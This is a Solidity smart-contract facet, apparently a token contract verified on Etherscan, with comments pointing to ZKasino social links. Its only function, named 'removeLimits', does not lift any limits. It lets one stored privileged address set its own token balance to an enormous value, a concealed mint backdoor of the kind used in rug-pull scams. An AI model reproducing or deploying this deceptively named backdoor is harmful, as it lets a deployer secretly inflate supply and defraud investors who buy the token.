/**
 *Submitted for verification at Etherscan.io on 2024-03-18
 */

/*  
   * SPDX-License-Identifier: MIT

      // Telegram: https://t.me/ZKasino
    // Twitter: https://twitter.com/ZKasino_io
    // Website: https://zkasino.io/
    // Discord: https://discord.com/invite/zkasino
    // Medium:  https://zkasino.medium.com/
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
